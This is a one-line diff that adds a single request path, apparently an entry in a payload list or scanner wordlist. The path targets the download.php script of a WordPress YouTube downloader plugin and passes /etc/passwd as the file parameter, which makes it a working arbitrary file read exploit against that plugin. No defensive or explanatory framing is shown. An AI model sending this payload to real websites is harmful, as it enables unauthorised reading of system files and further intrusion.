@@ -1,0 +1,1 @@
+/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd
